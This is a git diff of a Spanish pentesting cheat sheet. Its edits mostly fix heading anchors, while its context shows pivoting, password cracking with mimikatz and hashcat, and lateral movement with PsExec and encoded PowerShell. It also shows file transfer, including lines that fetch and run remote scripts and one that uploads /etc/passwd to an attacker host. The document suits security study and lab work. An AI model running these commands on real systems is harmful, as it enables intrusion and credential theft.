+####  6.2.1. <a name='descargar-el-proxy-y-el-agente'></a>Descargar el Proxy y el Agente
 
 ```bash
 wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_agent_0.7.5_Linux_64bit.tar.gz
 wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_proxy_0.7.5_Linux_64bit.tar.gz
 ```
 
-####  6.2.2. <a name='preparar-las-interfaces-p
-<a id="markdown-%3Ca-name%3D'preparar-las-interfaces-pa" name="%3Ca-name%3D'preparar-las-interfaces-pa"></a>a
+####  6.2.2. <a name='preparar-las-interfaces-para-el-tunel'></a>Preparar las interfaces para el tunel
 
 ```bash
 sudo ip tuntap add user $(whoami) mode tun ligolo
 sudo ip link set ligolo up
 ```
 
-####  6.2.3. <a name='configurar-p
-<a id="markdown-%3Ca-name%3D'configurar-pr" name="%3Ca-name%3D'configurar-pr"></a>r
+####  6.2.3. <a name='configurar-proxy-en-kali'></a>Configurar proxy en Kali
 
 ```bash
 ./proxy -laddr <LHOST>:443 -selfcert
 ```
 
-####  6.2.4. <a name='configurar-el-agente-en-la-máq
-<a id="markdown-%3Ca-name%3D'configurar-el-agente-en-la-m%C3%A1qu" name="%3Ca-name%3D'configurar-el-agente-en-la-m%C3%A1qu"></a>u
+####  6.2.4. <a name='configurar-el-agente-en-la-máquina-víctima'></a>Configurar el agente en la máquina víctima
 
 ```bash
 ./agent -connect <LHOST>:443 -ignore-cert
 ```
 
-####  6.2.5. <a name='configur
-<a id="markdown-%3Ca-name%3D'configura" name="%3Ca-name%3D'configura"></a>a
+####  6.2.5. <a name='configurar-la-sesión'></a>Configurar la sesión
 
 ```bash
 ligolo-ng » session
@@ -2039,11 +1936,9 @@ sudo ip r add 172.16.1.0/24 dev ligolo
 [Agent : user@target] » listener_add --addr <RHOST>:<LPORT> --to <LHOST>:<LPORT> --tcp
 ```
 
-###  6.3. <a name='s
-<a id="markdown-%3Ca-name%3D'ss" name="%3Ca-name%3D'ss"></a>s
+###  6.3. <a name='ssh-tunneling'></a>SSH Tunneling
 
-####  6.3.1. <a name='local-por
-<a id="markdown-%3Ca-name%3D'local-port" name="%3Ca-name%3D'local-port"></a>t
+####  6.3.1. <a name='local-port-forwarding'></a>Local Port Forwarding
 
 ![SSH Tunneling](./img/Pivoting.png)
 
@@ -2057,8 +1952,7 @@ ssh -N -L 0.0.0.0:4455:172.16.50.10:445 <user>@10.10.100.20
 
 En este caso, el puerto que queremos redireccionar es el `445` de la  máquina Windows **SHARES**.
 
-####  6.3.2. <a name='dynamic-por
-<a id="markdown-%3Ca-name%3D'dynamic-port" name="%3Ca-name%3D'dynamic-port"></a>t
+####  6.3.2. <a name='dynamic-port-forwarding'></a>Dynamic Port Forwarding
 
 ![SSH Tunneling](./img/Pivoting.png)
 
@@ -2078,8 +1972,7 @@ socks5 192.168.50.10 9999
 proxychains smbclient -p 4455 //172.16.50.10/<SHARE> -U <USERNAME> --password=<PASSWORD>
 ```
 
-####  6.3.3. <a name='remote-por
-<a id="markdown-%3Ca-name%3D'remote-port" name="%3Ca-name%3D'remote-port"></a>t
+####  6.3.3. <a name='remote-port-forwarding'></a>Remote Port Forwarding
 
 ![Remote Port Forwarding](./img/remote_dynamic_port_forwarding.png)
 
@@ -2105,8 +1998,7 @@ ssh -N -R 127.0.0.1:2345:10.10.100.20:5432 kali@192.168.50.10
 psql -h 127.0.0.1 -p 2345 -U postgres
 ```
 
-####  6.3.4. <a name='remote-dynamic-por
-<a id="markdown-%3Ca-name%3D'remote-dynamic-port" name="%3Ca-name%3D'remote-dynamic-port"></a>t
+####  6.3.4. <a name='remote-dynamic-port-forwarding'></a>Remote Dynamic Port Forwarding
 
 ![Remote Dynamic Port Forwarding](./img/remote_dynamic_port_forwarding.png)
 
@@ -2129,8 +2021,7 @@ socks5 127.0.0.1 9998 # agregar esta linea
 proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.10.100.20
 ```
 
-###  6.4. <a na
-<a id="markdown-%3Ca-nam" name="%3Ca-nam"></a>m
+###  6.4. <a name='sshuttle'></a>sshuttle
 
 | Sistema             | IP             |
 | ------------------- | -------------- |
@@ -2155,8 +2046,7 @@ sshuttle -r <user>@192.168.100.10:2222 10.10.100.0/24 172.16.50.0/24
 smbclient -L //172.16.50.10/ -U <user> --password=<password>
 ```
 
-###  6.5. <a n
-<a id="markdown-%3Ca-na" name="%3Ca-na"></a>a
+###  6.5. <a name='ssh.exe'></a>ssh.exe
 
 | Sistema             | IP             |
 | ------------------- | -------------- |
@@ -2193,8 +2083,7 @@ socks5 127.0.0.1 9998  # agregar esta linea
 proxychains psql -h 10.10.100.20 -U postgres
 ```
 
-###  6.6. <
-<a id="markdown-%3Ca" name="%3Ca"></a>a 
+###  6.6. <a name='plink'></a>Plink
 
 | Sistema             | IP             |
 | ------------------- | -------------- |
@@ -2226,8 +2115,7 @@ ss -tulpn
 xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:127.0.0.1:9833
 ```
 
-###  6.7. <
-<a id="markdown-%3Ca" name="%3Ca"></a>a 
+###  6.7. <a name='netsh'></a>Netsh
 
 | Sistema             | IP             |
 | ------------------- | -------------- |
@@ -2269,29 +2157,24 @@ netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
 netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.10
 ```
 
-##  7. <a name='passw
-<a id="markdown-%3Ca-name%3D'passwo" name="%3Ca-name%3D'passwo"></a>o
+##  7. <a name='passwords-attacks'></a>Passwords Attacks
 
-###  7.1. <a 
-<a id="markdown-%3Ca-n" name="%3Ca-n"></a>n
+###  7.1. <a name='fcrack'></a>fcrack
 
 ```bash
 fcrackzip -u -D -p /ruta/de/la/wordlist/wordlist.txt <FILE>.zip
 ```
 
-###  7.2. <a name='group-policy-prefe
-<a id="markdown-%3Ca-name%3D'group-policy-prefer" name="%3Ca-name%3D'group-policy-prefer"></a>r
+###  7.2. <a name='group-policy-preferences-(gpp)'></a>Group Policy Preferences (GPP)
 
-####  7.2.1. <a name=
-<a id="markdown-%3Ca-name%3D'" name="%3Ca-name%3D'"></a>'
+####  7.2.1. <a name='gpp-decrypt'></a>gpp-decrypt
 
 ```bash
 python3 gpp-decrypt.py -f Groups.xml
 python3 gpp-decrypt.py -c edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
 ```
 
-###  7.3. <a n
-<a id="markdown-%3Ca-na" name="%3Ca-na"></a>a
+###  7.3. <a name='hashcat'></a>Hashcat
 
 ```bash
 hashcat -m 0 hash.txt /ruta/de/la/wordlist/wordlist.txt           # MD5
@@ -2315,8 +2198,7 @@ hashcat -O -m 500 -a 3 -1 ?l -2 ?d -3 ?u  --force hash.txt ?3?3?1?1?1?1?2?3
 /usr/share/hashcat/rules/best64.rule
 ```
 
-####  7.3.1. <a name='reglas-pe
-<a id="markdown-%3Ca-name%3D'reglas-per" name="%3Ca-name%3D'reglas-per"></a>r
+####  7.3.1. <a name='reglas-personalizadas'></a>Reglas personalizadas
 
 > https://hashcat.net/wiki/doku.php?id=rule_based_attack
 
@@ -2359,8 +2241,7 @@ $1 $2 $3 c $!
 hashcat -r <FILE>.rule --stdout <FILE>.txt
 ```
 
-###  7.4. <
-<a id="markdown-%3Ca" name="%3Ca"></a>a 
+###  7.4. <a name='hydra'></a>Hydra
 
 ```bash
 hydra <RHOST> -l <USERNAME> -p <PASSWORD> <PROTOCOL>
@@ -2370,7 +2251,7 @@ hydra -l <USERNAME> -P <PASSWORDS> <TARGET> <SERVICE> -s <PORT>
 hydra -l admin -P /usr/share/wordlists/rockyou.txt <RHOST> http-post-form "/login/:user=^USER^&pass=^PASS^:Invalid password"
 ```
 
-###  7.5. <
+###  7.5. <a name='john'></a>John
 
 ```bash
 keepass2john <FILE>
@@ -2385,15 +2266,13 @@ unshadow passwd shadow > hashes
 john --wordlist-/usr/share/wordlists/rockyou.txt hashes
 ```
 
-###  7.6. <a n
-<a id="markdown-%3Ca-na" name="%3Ca-na"></a>a
+###  7.6. <a name='lazagne'></a>LaZagne
 
 ```bash
 laZagne.exe all
 ```
 
-###  7.7. <a na
-<a id="markdown-%3Ca-nam" name="%3Ca-nam"></a>m
+###  7.7. <a name='mimikatz'></a>Mimikatz
 
 [Mimikatz](https://github.com/gentilkiwi/mimikatz) es una herramienta que permite extraer contraseñas en texto claro, hash, código PIN y tickets kerberos de la memoria. A su vez, también puede realizar pass-the-hash, pass-the-ticket o construir Golden tickets.
 
@@ -2436,24 +2315,20 @@ net use C:\\<RHOST>\admin$ /user:Administrator mimikatz
 dir \\<RHOST>\c$ /user:<USERNAME> mimikatz
 ```
 
-###  7.8. <a na
-<a id="markdown-%3Ca-nam" name="%3Ca-nam"></a>m
+###  7.8. <a name='pypykatz'></a>pypykatz
 
 ```bash
 pypykatz lsa minidump lsass.dmp
 pypykatz registry --sam sam system
 ```
 
-##  8. <a name='transferencia
-<a id="markdown-%3Ca-name%3D'transferencia-" name="%3Ca-name%3D'transferencia-"></a>-
+##  8. <a name='transferencia-de-archivos'></a>Transferencia de Archivos
 
-###  8.1. <a n
-<a id="markdown-%3Ca-na" name="%3Ca-na"></a>a
+###  8.1. <a name='windows-1'></a>Windows
 
 Diferentes utilidades para las operaciones de transferencia de archivos en Windows.
 
-####  8.1.1. <a name='operaciones
-<a id="markdown-%3Ca-name%3D'operaciones-" name="%3Ca-name%3D'operaciones-"></a>-
+####  8.1.1. <a name='operaciones-de-descarga'></a>Operaciones de Descarga
 
 ##### Codificación y Decodificación PowerShell Base64
 
@@ -2553,7 +2428,7 @@ iex (Invoke-WebRequest "http://192.168.1.19/script.ps1" -OutFile script.ps1)
 Invoke-WebRequest "http://192.168.1.19/script.ps1" -OutFile script.ps1 | iex
 ```
 
-####  8.1.2. <
+####  8.1.2. <a name='smb'></a>SMB
 
 ##### Máquina atacante
 
@@ -2580,7 +2455,7 @@ sudo impacket-smbserver share -smb2support /tmp/smbshare -user kali -password ka
 net use n: \\192.168.1.19\share /user:kali kali
 ```
 
-####  8.1.3. <
+####  8.1.3. <a name='ftp'></a>FTP
 
 Otra forma de transferir archivos es mediante FTP (Protocolo de transferencia de archivos), que utiliza los puertos TCP/21 y TCP/20. Podemos utilizar el cliente FTP o PowerShell Net.WebClient para descargar archivos desde un servidor FTP.
 
@@ -2622,8 +2497,7 @@ C:\htb>more file.txt
 This is a test file
 ```
 
-####  8.1.4. <a name='operacion
-<a id="markdown-%3Ca-name%3D'operacione" name="%3Ca-name%3D'operacione"></a>e
+####  8.1.4. <a name='operaciones-de-subida'></a>Operaciones de Subida
 
 ##### Codificación y decodificación PowerShell Base64
 
@@ -2686,13 +2560,11 @@ IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNh
 echo <base64> | base64 -d -w 0 > hosts
 ```
 
-###  8.2. <
-<a id="markdown-%3Ca" name="%3Ca"></a>a 
+###  8.2. <a name='linux-1'></a>Linux
 
 Diferentes utilidades para las operaciones de transferencia de archivos en Linux.
 
-####  8.2.1. <a name='operaciones
-<a id="markdown-%3Ca-name%3D'operaciones-" name="%3Ca-name%3D'operaciones-"></a>-
+####  8.2.1. <a name='operaciones-de-descarga-1'></a>Operaciones de Descarga
 
 ##### Codificación/Decodificación Base64
 
@@ -2729,8 +2601,7 @@ cURL es muy similar a wget, pero la opción del nombre del archivo de salida es 
 curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -o /tmp/LinEnum.sh
 ```
 
-####  8.2.2. <a name='ataques-sin-archivos-
-<a id="markdown-%3Ca-name%3D'ataques-sin-archivos-u" name="%3Ca-name%3D'ataques-sin-archivos-u"></a>u
+####  8.2.2. <a name='ataques-sin-archivos-usando-linux'></a>Ataques sin archivos usando Linux
 
 ##### Descarga sin archivos con cURL
 
@@ -2744,8 +2615,7 @@ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/
 Hello World!
 ```
 
-####  8.2.3. <a name='descargar-con-bas
-<a id="markdown-%3Ca-name%3D'descargar-con-bash" name="%3Ca-name%3D'descargar-con-bash"></a>h
+####  8.2.3. <a name='descargar-con-bash-(/dev/tcp)'></a>Descargar con Bash (/dev/tcp)
 
 También puede haber situaciones en las que ninguna de las herramientas de transferencia de archivos más conocidas esté disponible. Siempre que esté instalada la versión `2.04` o superior de Bash (compilada con `--enable-net-redirections`), el archivo de dispositivo integrado /dev/tcp se puede utilizar para descargas de archivos simples.
 
@@ -2777,15 +2647,13 @@ Imprimimos la respuesta
 cat <&3
 ```
 
-####  8.2.4. <a name='d
-<a id="markdown-%3Ca-name%3D'de" name="%3Ca-name%3D'de"></a>e
+####  8.2.4. <a name='descargas-ssh'></a>Descargas SSH
 
 ```bash
 scp elliot@192.168.1.19:/root/myroot.txt . 
 ```
 
-####  8.2.5. <a name
-<a id="markdown-%3Ca-name%3D" name="%3Ca-name%3D"></a>=
+####  8.2.5. <a name='web-upload'></a>Web Upload
 
 Podemos usar uploadserver , un módulo extendido de Python HTTP.Server módulo, que incluye una página de carga de archivos. Para este ejemplo de Linux, veamos cómo podemos configurar el `uploadserver` módulo a utilizar HTTPS para una comunicación segura.
 
@@ -2825,8 +2693,7 @@ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/e
 
 Usamos la opción `--insecure` porque utilizamos un certificado autofirmado en el que confiamos.
 
-####  8.2.6. <a 
-<a id="markdown-%3Ca-n" name="%3Ca-n"></a>n
+####  8.2.6. <a name='netcat'></a>Netcat
 
 ##### Máquina atacante
 
@@ -2840,8 +2707,7 @@ nc -l -p 4444 > output.txt
 nc -w 3 192.168.1.10 4444 < output.txt
 ```
 
-####  8.2.7. <a name='método-alternativo-de-transferencia-de-
-<a id="markdown-%3Ca-name%3D'm%C3%A9todo-alternativo-de-transferencia-de-a" name="%3Ca-name%3D'm%C3%A9todo-alternativo-de-transferencia-de-a"></a>a
+####  8.2.7. <a name='método-alternativo-de-transferencia-de-archivos-web'></a>Método alternativo de transferencia de archivos web
 
 ##### Creación de un servidor web con Python3
 
@@ -2874,8 +2740,7 @@ php -S 0.0.0.0:8000
 wget 192.168.1.19:8000/filetotransfer.txt
 ```
 
-####  8.2.8. <a name='operacion
-<a id="markdown-%3Ca-name%3D'operacione" name="%3Ca-name%3D'operacione"></a>e
+####  8.2.8. <a name='operaciones-de-subida-1'></a>Operaciones de Subida
 
 ##### SCP
 
@@ -2883,13 +2748,11 @@ wget 192.168.1.19:8000/filetotransfer.txt
 scp /etc/passwd student@10.10.14.30:/home/student/
 ```
 
-##  9. <a name='movimi
-<a id="markdown-%3Ca-name%3D'movimie" name="%3Ca-name%3D'movimie"></a>e
+##  9. <a name='movimiento-lateral'></a>Movimiento Lateral
 
-###  9.1. <
+###  9.1. <a name='rdp'></a>RDP
 
-####  9.1.1. <a na
-<a id="markdown-%3Ca-nam" name="%3Ca-nam"></a>m
+####  9.1.1. <a name='xfreerdp-1'></a>xfreerdp
 
 ```bash
 xfreerdp /u:'<USER>' /p:'<PASSWORD>' /d:hacklab.local /v:192.168.56.10 /dynamic-resolution /drive:.,linux /bpp:8 /compression -themes -wallpaper /clipboard /audio-mode:0 /auto-reconnect -glyph-cache
@@ -2906,18 +2769,16 @@ Parámetros:
 - `/auto-reconnect`: Se vuelve a conectar automáticamente si la conexión se interrumpe, lo que mejora la estabilidad de la sesión.
 - `-glyph-cache`: permite el almacenamiento en caché de glifos (caracteres de texto) para reducir la cantidad de datos enviados para la representación de texto.
 
-###  9.2. <
+###  9.2. <a name='smb-1'></a>SMB
 
-####  9.2.1. <a 
-<a id="markdown-%3Ca-n" name="%3Ca-n"></a>n
+####  9.2.1. <a name='psexec'></a>PsExec
 
 [PsExec](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec) está incluido en el conjunto de herramientas Sysinternals de Microsoft, una colección de herramientas diseñadas para ayudar a los administradores en tareas de gestión del sistema. Esta herramienta facilita la ejecución remota de comandos y recupera la salida a través de un pipe con nombre utilizando el protocolo SMB, operando en el puerto TCP 445 y el puerto TCP 139.
 
 ```powershell
 .\PsExec.exe \\MS02 -i -u HACKLAB.LOCAL\elliot -p Password123 cmd
 ```
-####  9.2.2. <a name='s
-<a id="markdown-%3Ca-name%3D'sh" name="%3Ca-name%3D'sh"></a>h
+####  9.2.2. <a name='sharpnopsexec'></a>SharpNoPSExec
 
 [SharpNoPSExec](https://github.com/juliourena/SharpNoPSExec) es una herramienta diseñada para facilitar el movimiento lateral aprovechando los servicios existentes en un sistema de destino sin crear otros nuevos ni escribir en el disco, minimizando así el riesgo de detección. La herramienta consulta todos los servicios en la máquina de destino, identificando aquellos con un tipo de inicio configurado como deshabilitado o manual, estado actual de detenido y ejecutándose con privilegios de LocalSystem. Selecciona aleatoriamente uno de estos servicios y modifica temporalmente su ruta binaria para apuntar a una carga útil elegida por el atacante. Tras la ejecución, `SharpNoPSExec` espera aproximadamente 5 segundos antes de restaurar la configuración original del servicio, devolviendo el servicio a su estado anterior. Este enfoque no solo proporciona un shell, sino que también evita la creación de nuevos servicios, lo que podría ser detectado por los sistemas de monitoreo de seguridad.
 
@@ -2935,8 +2796,7 @@ Ejecutamos `SharpNoPSExec`
 
 > Creamos un shell en [revshells.com](https://www.revshells.com/)
 
-####  9.2.3. <a n
-<a id="markdown-%3Ca-na" name="%3Ca-na"></a>a
+####  9.2.3. <a name='nimexec'></a>NimExec
 
 [NimExec](https://github.com/frkngksl/NimExec) es una herramienta de ejecución remota de comandos sin archivos que utiliza el Protocolo de Control de Servicios Remotos (MS-SCMR). Manipula la ruta binaria de un servicio con privilegios de LocalSystem para ejecutar comandos en la máquina objetivo y luego restaura la configuración original. Funciona enviando paquetes RPC personalizados a través de SMB y el pipe svcctl, autenticándose mediante un hash NTLM. Al evitar funciones específicas del sistema operativo y aprovechar la compilación cruzada de Nim, NimExec es compatible con múltiples sistemas operativos, ofreciendo una solución versátil y eficiente.
 
@@ -2952,22 +2812,19 @@ Ejecutamos NimExec
 .\NimExec -u <user> -d hacklab.local -p <password> -t 192.168.56.10 -c "cmd.exe /c powershell -e JABjAGwAaQBlAG...SNIP...AbwBzAGUAKAApAA==" -v
 ```
 
-####  9.2.4. <a nam
-<a id="markdown-%3Ca-name" name="%3Ca-name"></a>e
+####  9.2.4. <a name='psexec.py'></a>psexec.py
 
 ```bash
 impacket-psexec HACKLAB.LOCAL/<USER>:'<PASSWORD>'@192.168.56.10
 ```
 
-####  9.2.5. <a name
-<a id="markdown-%3Ca-name%3D" name="%3Ca-name%3D"></a>=
+####  9.2.5. <a name='smbexec.py'></a>smbexec.py
 
 ```bash
 impacket-smbexec HACKLAB.LOCAL/<USER>:'<PASSWORD>'@192.168.56.10
 ```
 
-####  9.2.6. <a nam
-<a id="markdown-%3Ca-name" name="%3Ca-name"></a>e
+####  9.2.6. <a name='atexec.py'></a>atexec.py
 
 El [script atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py) utiliza el servicio Programador de tareas de Windows, al que se puede acceder a través de la tubería SMB `atsvc`. Nos permite agregar de forma remota una tarea al programador, que se ejecutará en el momento designado.
 
@@ -2987,8 +2844,7 @@ Ahora pasemos el nombre de dominio, el usuario administrador, la contraseña y l
 impacket-atexec HACKLAB.LOCAL/<USER>:'<PASSWORD>'@192.168.56.10 "powershell -e ...SNIP...AbwBzAGUAKAApAA=="
 ```
 
-###  9.3. <
-<a id="markdown-%3Ca" name="%3Ca"></a>a 
+###  9.3. <a name='winrm'></a>WinRM
 
 [Windows Remote Management (WinRM)](https://learn.microsoft.com/en-us/windows/win32/winrm/portal) es la versión de Microsoft del [protocolo WS-Management (Web Services-Management)](https://learn.microsoft.com/en-us/windows/win32/winrm/ws-management-protocol) , un protocolo estándar para administrar software y hardware de forma remota. WinRM facilita la transferencia de datos de administración entre computadoras, lo que permite a los administradores realizar una variedad de tareas, como ejecutar scripts y recuperar datos de eventos de sistemas remotos.
 
@@ -2997,8 +2853,7 @@ WinRM se usa comúnmente junto con PowerShell con fines administrativos y de aut
 ```bash
 netexec winrm 192.168.56.10 -u <user> -p <password>
 ```
-####  9.3.1. <a name='in
-<a id="markdown-%3Ca-name%3D'inv" name="%3Ca-name%3D'inv"></a>v
+####  9.3.1. <a name='invoke-command'></a>Invoke-Command
 Podemos usar PowerShell para interactuar con WinRM en Windows, PowerShell tiene cmdlets como [Invoke-Command](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command?view=powershell-7.4) y [Enter-PSSession](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.4) para administrar y ejecutar comandos en sistemas remotos.
 
 ```powershell
@@ -3019,8 +2874,7 @@ DC01
 
 > Si usamos la IP en lugar del nombre de la computadora, debemos usar credenciales explícitas o, alternativamente, podemos usar la bandera `-Authentication Negotiate` en lugar de proporcionar credenciales explícitas.
 
-####  9.3.2. <
-<a id="markdown-%3Ca" name="%3Ca"></a>a 
+####  9.3.2. <a name='winrs'></a>WINRS
 
 [winrs](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/winrs) (Windows Remote Shell) es una herramienta de línea de comandos que permite ejecutar comandos en una máquina con Windows utilizando WinRM de forma remota. A continuación se muestra un ejemplo de cómo utilizar `winrs` para ejecutar un comando en un servidor remoto:
 
@@ -3038,8 +2892,7 @@ hacklab.local\elliot
 DC01
 ```
 
-####  9.3.3. <a name='ent
-<a id="markdown-%3Ca-name%3D'ente" name="%3Ca-name%3D'ente"></a>e
+####  9.3.3. <a name='enter-pssession'></a>Enter-PSSession
 
 Podemos usar el Cmdlet `Enter-PSSession` para un shell interactivo usando PowerShell Remoting. Este cmdlet nos permite iniciar una sesión interactiva con la computadora remota, ya sea utilizando una sesión creada con `New-PSSession`, especificando credenciales explícitas, o aprovechando la sesión actual donde se ejecuta el comando. Por ejemplo, reutilicemos el `$sessionMS02` variable que creamos anteriormente. Especificando el `Enter-PSSession` y la variable nos dará un mensaje interactivo de PowerShell en la computadora remota, lo que nos permite ejecutar comandos como si nos registraran directamente.
 
@@ -3053,8 +2906,7 @@ PS C:\Temp> Enter-PSSession $sessionMS02
 [MS02]: PS C:\Users\elliot\Documents>
 ```
 
-####  9.3.4. <a n
-<a id="markdown-%3Ca-na" name="%3Ca-na"></a>a
+####  9.3.4. <a name='netexec-4'></a>NetExec
 
 Con `NetExec` podemos usar la opción `-x` para ejecutar comandos CMD o PowerShell. Por ejemplo, para ejecutar un comando básico como `ipconfig` podemos usar el siguiente comando:
 
@@ -3062,8 +2914,7 @@ Con `NetExec` podemos usar la opción `-x` para ejecutar comandos CMD o PowerShe
 netexec winrm 192.168.56.10 -u elliot -p Password123 -x "ipconfig"
 ```
 
-####  9.3.5. <a name
-<a id="markdown-%3Ca-name%3D" name="%3Ca-name%3D"></a>=
+####  9.3.5. <a name='evil-winrm'></a>Evil-WinRM
 
 [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) es una herramienta basada en Ruby que facilita la interacción con WinRM desde Linux. Ofrece una interfaz sencilla para ejecutar comandos y administrar sistemas Windows de forma remota.
 
@@ -3073,14 +2924,11 @@ Una vez instalado, podemos usar `evil-winrm` para conectarse a una máquina Wind
 evil-winrm -i 192.168.56.10 -u elliot -p Password123
 ```
 
-##  10. <a name='escalación-de
-<a id="markdown-%3Ca-name%3D'escalaci%C3%B3n-de-" name="%3Ca-name%3D'escalaci%C3%B3n-de-"></a>-
+##  10. <a name='escalación-de-privilegios'></a>Escalación de Privilegios
 
-###  10.1. <a n
-<a id="markdown-%3Ca-na" name="%3Ca-na"></a>a
+###  10.1. <a name='windows-2'></a>Windows
 
-####  10.1.1. <a name=
-<a id="markdown-%3Ca-name%3D'" name="%3Ca-name%3D'"></a>'
+####  10.1.1. <a name='enumeración-1'></a>Enumeración
 
 ##### Sistema
 
@@ -3330,8 +3178,7 @@ reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlo
 - [SharpUp](https://github.com/GhostPack/SharpUp)
 - [Seatbelt](https://github.com/GhostPack/Seatbelt)
 
-####  10.1.2. <a name='escalación-de
-<a id="markdown-%3Ca-name%3D'escalaci%C3%B3n-de-" name="%3Ca-name%3D'escalaci%C3%B3n-de-"></a>-
+####  10.1.2. <a name='escalación-de-privilegios-1'></a>Escalación de Privilegios
 
 ##### AlwaysInstallElevated
 
@@ -4228,11 +4075,9 @@ También podemos utilizar `SeTakeOwnershipPrivilege` para modificar la propiedad
 
     Tras asumir la propiedad, modificamos los permisos para obtener control total. Ahora podemos modificar los valores de la clave para ejecutar código malicioso, iniciar servicios con privilegios de SYSTEM o agregar nuevas entradas de inicio.
 
-###  10.2. <
-<a id="markdown-%3Ca" name="%3Ca"></a>a 
+###  10.2. <a name='linux-2'></a>Linux
 
-####  10.2.1. <a name=
-<a id="markdown-%3Ca-name%3D'" name="%3Ca-name%3D'"></a>'
+####  10.2.1. <a name='enumeración-2'></a>Enumeración
 
 ##### Sistema
 
@@ -4388,8 +4233,7 @@ su - root2
 - [Linux Exploit Suggester](https://github.com/The-Z-Labs/linux-exploit-suggester)
 
 
-####  10.2.2. <a name='escalación-de
-<a id="markdown-%3Ca-name%3D'escalaci%C3%B3n-de-" name="%3Ca-name%3D'escalaci%C3%B3n-de-"></a>-
+####  10.2.2. <a name='escalación-de-privilegios-2'></a>Escalación de Privilegios
 
 > Referencias: https://gtfobins.github.io/
 
@@ -4567,8 +4411,7 @@ Para ver los trabajos cron de todo el sistema, podemos verificar los archivos en
 
 ###### Explotación de tareas cron
 
-###  10.3. <a name='técnicas-de-explotación-de-t
-<a id="markdown-%3Ca-name%3D't%C3%A9cnicas-de-explotaci%C3%B3n-de-tr" name="%3Ca-name%3D't%C3%A9cnicas-de-explotaci%C3%B3n-de-tr"></a>r
+###  10.3. <a name='técnicas-de-explotación-de-trabajos-cron'></a>Técnicas de explotación de trabajos Cron
 
 | Técnica                          | Descripción                                                                                   |
 |----------------------------------|-----------------------------------------------------------------------------------------------|
@@ -5091,16 +4934,13 @@ elliot@debian:~$ ./exploit-2 /usr/bin/sudo
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-##  11. <a name='acti
-<a id="markdown-%3Ca-name%3D'activ" name="%3Ca-name%3D'activ"></a>v
+##  11. <a name='active-directory'></a>Active Directory
 
-###  11.1. <a name='powershell-para-gestionar-acti
-<a id="markdown-%3Ca-name%3D'powershell-para-gestionar-activ" name="%3Ca-name%3D'powershell-para-gestionar-activ"></a>v
+###  11.1. <a name='powershell-para-gestionar-active-directory'></a>PowerShell para gestionar Active Directory
 
 Listado de Cmdlets utiles para realizar operaciones y enumeración básica en Active Directory.
 
-####  11.1.1. <a name='importar-módulo-de-acti
-<a id="markdown-%3Ca-name%3D'importar-m%C3%B3dulo-de-activ" name="%3Ca-name%3D'importar-m%C3%B3dulo-de-activ"></a>v
+####  11.1.1. <a name='importar-módulo-de-active-directory'></a>Importar módulo de Active Directory
 
 Para utilizar la mayoria de los Cmdlets listados a continuación, debemos importar en primer lugar el modulo `ActiveDirectory`.
 
@@ -5108,8 +4948,7 @@ Para utilizar la mayoria de los Cmdlets listados a continuación, debemos import
 Import-Module ActiveDirectory
 ```
 
-####  11.1.2. <a n
-<a id="markdown-%3Ca-na" name="%3Ca-na"></a>a
+####  11.1.2. <a name='sistema'></a>Sistema
 
 ##### Obtener Variables de entorno
 
@@ -5157,8 +4996,7 @@ Get-MpComputerStatus
 Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 ```
 
-####  11.1.3. <a na
-<a id="markdown-%3Ca-nam" name="%3Ca-nam"></a>m
+####  11.1.3. <a name='usuarios'></a>Usuarios
 
 ##### Crear un nuevo usuario
 
@@ -5242,8 +5080,7 @@ Unlock-ADAccount -Identity "NombreUsuario"
 Get-ADUser -Identity "NombreUsuario" -Properties *
 ```
 
-####  11.1.4. <a 
-<a id="markdown-%3Ca-n" name="%3Ca-n"></a>n
+####  11.1.4. <a name='grupos'></a>Grupos
 
 ##### Crear un nuevo grupo
 ```powershell
@@ -5283,8 +5120,7 @@ Get-ADGroup -Filter * -SearchBase "OU=NombreOU,DC=dominio,DC=com"
 ```powershell
 Get-ADGroupMember -Identity "NombreGrupo"
 ```
-####  11.1.5. <a name='trusts-
-<a id="markdown-%3Ca-name%3D'trusts-" name="%3Ca-name%3D'trusts-"></a>(
+####  11.1.5. <a name='trusts-(confianzas)'></a>Trusts (Confianzas)
 
 ##### Verificar las relaciones de confianza de dominio
 
@@ -5293,8 +5129,7 @@ Get-ADTrust -Filter *
 ```
 Este cmdlet imprimirá las relaciones de confianza que tenga el dominio. Podemos determinar si son confianzas dentro de nuestro bosque o con dominios de otros bosques, el tipo de confianza, la dirección de la confianza y el nombre del dominio con el que está la relación.
 
-####  11.1.6. <a name='
-<a id="markdown-%3Ca-name%3D'c" name="%3Ca-name%3D'c"></a>c
+####  11.1.6. <a name='computadoras'></a>Computadoras
 
 ##### Obtener información detallada de un equipo
 
@@ -5343,8 +5178,7 @@ Enable-ADAccount -Identity "NombreEquipo"
 Remove-ADComputer -Identity "NombreEquipo"
 ```
 
-####  11.1.7. <a name='unidades-o
-<a id="markdown-%3Ca-name%3D'unidades-or" name="%3Ca-name%3D'unidades-or"></a>r
+####  11.1.7. <a name='unidades-organizativas'></a>Unidades Organizativas
 
 ##### Crear una nueva Unidad Organizativa
 
@@ -5370,8 +5204,7 @@ Get-ADOrganizationalUnit -Filter *
